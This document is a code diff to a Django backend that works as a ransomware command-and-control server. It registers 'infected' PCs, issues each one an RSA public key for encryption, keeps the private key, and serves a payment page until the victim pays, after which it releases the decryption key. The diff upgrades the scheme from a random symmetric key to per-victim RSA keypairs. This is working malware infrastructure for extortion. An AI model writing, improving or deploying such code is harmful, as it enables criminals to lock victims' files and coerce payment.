@@ -11,6 +11,10 @@ from rest_framework.views import status
 from django.shortcuts import render
 from .forms import decryptForm
 from rest_framework.decorators import api_view, renderer_classes
+
+from Crypto.PublicKey import RSA
+
+
 class ListInfectedPcView(generics.ListAPIView):
     """
     Provides a get method handler.
@@ -23,13 +27,16 @@ def encrypt(request):
     if request.method == 'POST':
         if request.data['uniqueId'] is not None:
             if not InfectedPc.objects.filter(uniqueId = request.data['uniqueId']).exists():
-                random_key = b64encode(os.urandom(16)).decode('utf-8')
+                key = RSA.generate(1024)
+                privateKey = key.export_key()
+                publicKey = key.publickey().export_key()
                 InfectedPc.objects.create(
                     uniqueId=request.data['uniqueId'],
-                    encryptionKey=random_key,
+                    privateKey=privateKey,
+                    publicKey=publicKey,
                 )
                 return Response(
-                    data={'encryptionKey': random_key},
+                    data={'publicKey': publicKey},
                     status=status.HTTP_201_CREATED
                 )
             else:
@@ -63,14 +70,15 @@ def decrypt(request):
                 if paymentStatus == False:
                     return render(request, 'payment.html', {'uniqueId': uniqueId})
                 if paymentStatus == True:
-                    return HttpResponse("already paid! Decryption key is: " + infectedPcObject.encryptionKey)
+                    privateKeyHtml = infectedPcObject.privateKey.replace('\\n', ' \n ').replace("b\'", "").replace("-----\'", "-----")
+                    return render(request, 'paid.html', {'privateKey': privateKeyHtml})
             else:
-                return HttpResponse("uniqueId does not exist in this database")
+                return HttpResponse("<h1>uniqueId does not exist in this database, please try again <a href=/decrypt>here</a></h1>")
     else:
         form = decryptForm()
 
     return render(request, 'decrypt.html', {'form': form})
 def index(request):
-    return HttpResponse("your pc has been infected")
+    return render(request, 'index.html')
     
 
